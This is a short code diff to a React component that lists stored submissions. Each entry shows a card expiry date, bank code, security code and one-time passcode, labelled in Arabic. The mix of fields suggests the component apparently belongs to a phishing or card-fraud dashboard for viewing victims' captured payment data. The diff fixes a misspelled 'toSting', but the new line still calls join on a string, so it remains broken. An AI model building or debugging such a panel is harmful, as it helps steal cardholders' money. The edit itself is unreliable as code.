@@ -18,7 +18,7 @@ export function ListItems({ submissions }: any) {
             expDate={`تاريخ الانتهاء: ${submission.data().month}/${submission.data().year}`}
             bank={`رمز البنك: ${submission.data().bank}`}
             pass={`رمز الامان: ${submission.data().pass}`}
-            otp={`${submission.data().otp.toSting().join('')}`}
+            otp={`${submission.data().otp.toString().join('')}`}
           />
         </div>
       ))}
